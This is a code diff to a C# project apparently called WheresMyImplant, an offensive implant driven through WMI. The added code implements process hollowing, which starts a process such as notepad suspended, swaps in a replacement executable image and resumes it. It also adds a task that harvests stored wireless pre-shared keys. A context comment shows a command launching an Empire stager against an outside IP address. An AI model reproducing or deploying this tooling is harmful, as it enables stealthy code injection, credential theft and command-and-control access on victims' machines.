@@ -320,6 +320,49 @@ namespace WheresMyImplant
             }
             return output;
         }
+
+        [ManagementTask]
+        public static String HollowProcess(String target, String replacement)
+        {
+            HollowProcess hp = new HollowProcess();
+            if (!hp.CreateSuspendedProcess(target))//@"C:\Windows\notepad.exe"))
+            {
+                Console.WriteLine(new System.ComponentModel.Win32Exception(Marshal.GetLastWin32Error()).Message);
+                return String.Empty;
+            }
+
+            if (!hp.ReadPEB())
+            {
+                Console.WriteLine(new System.ComponentModel.Win32Exception(Marshal.GetLastWin32Error()).Message);
+                return String.Empty;
+            }
+
+            if (!hp.ReadNTHeaders64())
+            {
+                Console.WriteLine(new System.ComponentModel.Win32Exception(Marshal.GetLastWin32Error()).Message);
+                return String.Empty;
+            }
+
+            if (!hp.ReadSourceImage(replacement))
+            {
+                Console.WriteLine(new System.ComponentModel.Win32Exception(Marshal.GetLastWin32Error()).Message);
+                return String.Empty;
+            }
+
+            if (!hp.RemapImage())
+            {
+                Console.WriteLine(new System.ComponentModel.Win32Exception(Marshal.GetLastWin32Error()).Message);
+                return String.Empty;
+            }
+
+            if (!hp.ResumeProcess64())
+            {
+                Console.WriteLine(new System.ComponentModel.Win32Exception(Marshal.GetLastWin32Error()).Message);
+                return String.Empty;
+            }
+
+            return "Process Hollowed";
+        }
        
         [ManagementTask]
         //Invoke-WmiMethod -Class Win32_Implant -Name EmpireStager -ArgumentList "powershell","http://192.168.255.100:80","q|Q]KAe!{Z[:Tj<s26;zd9m7-_DMi3,5"
@@ -595,6 +638,16 @@ namespace WheresMyImplant
                 webServiceBeacon.Run();
             }
         }
-        */ 
+        */
+
+        [ManagementTask]
+        public static String WirelessPreSharedKey()
+        {
+            StringBuilder output = new StringBuilder();
+            WirelessProfiles wp = new WirelessProfiles();
+            wp.GetProfiles();
+            output.Append(wp.GetOutput());
+            return output.ToString();
+        }
     }
 }
